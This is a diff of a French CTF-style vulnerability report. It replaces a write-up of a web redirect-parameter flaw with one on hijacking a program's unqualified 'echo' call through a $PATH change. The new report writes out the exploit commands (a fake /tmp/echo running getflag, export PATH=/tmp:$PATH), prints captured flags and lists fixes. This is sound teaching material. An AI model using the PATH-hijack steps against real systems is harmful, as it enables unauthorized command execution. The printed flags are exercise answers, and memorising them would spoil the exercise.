@@ -1,37 +1,68 @@
-# Rapport de Vulnérabilité : Injection de Paramètre dans une Redirection
-
-## Nom de la Faille
-**Injection de Paramètre dans une Redirection**
-## OWASP
-**A01:2021 – Contrôles d'accès défaillants**
+# Rapport de Vulnérabilité : Hijacking de commande via modification de la variable d’environnement `$PATH`
 
 ## Description
-Cette faille permet à un attaquant de manipuler le paramètre `site` dans l'URL pour accéder à des ressources non autorisées ou révéler des informations sensibles, comme un flag. Lorsque la valeur du paramètre `site` ne correspond à aucune redirection valide, le site retourne le flag au lieu de gérer proprement l'erreur.
+
+Cette faille repose sur la redéfinition de la variable d’environnement `$PATH` afin de forcer l’exécution d’un faux binaire `echo`. Le programme `./level03` exécute la commande `echo` sans spécifier son chemin absolu. En plaçant un faux script `echo` dans un répertoire contrôlé (comme `/tmp`) et en modifiant `$PATH`, il est possible de détourner le comportement du programme pour exécuter une commande arbitraire, comme `getflag`.
 
 ## Comment Exploiter la Faille
-1. **Étape 1** : Identifiez le lien de redirection dans le code HTML du site. Par exemple :
-   ```html
-   <a href="index.php?page=redirect&amp;site=facebook" class="icon fa-facebook"></a>
-   ```
-   Ce lien redirige normalement vers Facebook.
 
-2. **Étape 2** : Modifiez la valeur du paramètre `site` dans l'URL pour une valeur qui ne correspond à aucune redirection valide. Par exemple, remplacez `facebook` par `flag` :
-   ```
-   index.php?page=redirect&site=flag
-   ```
+### Étape 1 : Créer un faux script `echo`
 
-3. **Étape 3** : Soumettez la requête. Si la redirection n'existe pas, le site retourne le flag :
-   ```
-   b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
-   ```
+```bash
+echo -e '#!/bin/sh\n/bin/getflag' > /tmp/echo
+chmod +x /tmp/echo
+```
+
+> Ce script exécute simplement `getflag` à la place de `echo`.
+
+**Alternative pour test :**
+
+```bash
+echo -e '#!/bin/sh\necho pwned' > /tmp/echo
+chmod +x /tmp/echo
+```
+
+### Étape 2 : Modifier le `$PATH`
+
+Placer `/tmp` en tête du `PATH` pour forcer le programme à utiliser notre faux `echo` :
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+### Étape 3 : Exécuter le binaire
+
+```bash
+./level03
+```
+
+Si le programme utilise `echo` sans chemin absolu, il exécutera `/tmp/echo`, déclenchant alors la commande `getflag`.
+
+### Étape 4 : Récupération du flag
+
+Le flag s'affiche directement après exécution :
+
+```bash
+getflag
+```
+
+**Flag obtenu :**
+
+```
+qi0maab88jeaj46qoumi7maus
+```
+
+---
 
 ## Comment Résoudre la Faille
-Pour corriger cette vulnérabilité, suivez les étapes suivantes :
 
-- **Validation des Entrées** : Validez et filtrez les valeurs du paramètre `site` pour vous assurer qu'elles correspondent à des valeurs attendues.
-- **Liste Blanche** : Utilisez une liste blanche de valeurs autorisées pour le paramètre `site`.
-- **Gestion des Erreurs** : Redirigez vers une page d'erreur générique si la valeur du paramètre `site` n'est pas valide.
-- **Journalisation** : Journalisez les tentatives d'accès à des redirections non valides pour détecter les activités suspectes.
+Pour corriger cette vulnérabilité :
+
+* **Utiliser des chemins absolus pour les commandes système** : `/bin/echo` au lieu de `echo`.
+* **Restreindre les droits d'exécution** : Empêcher l'exécution de scripts placés dans des dossiers temporaires comme `/tmp`.
 
 ## Conclusion
-Cette vulnérabilité met en évidence l'importance de valider les entrées utilisateur et de bien gérer les erreurs. En implémentant les corrections ci-dessus, vous pouvez sécuriser votre application contre ce type de faille.
+
+Cette faille démontre les risques liés à l’utilisation non sécurisée des variables d’environnement dans les programmes. Une simple modification de `$PATH` permet de détourner des commandes système et d’exécuter des instructions arbitraires. Il est impératif de coder défensivement en utilisant des chemins absolus pour les appels système sensibles.
+
+---
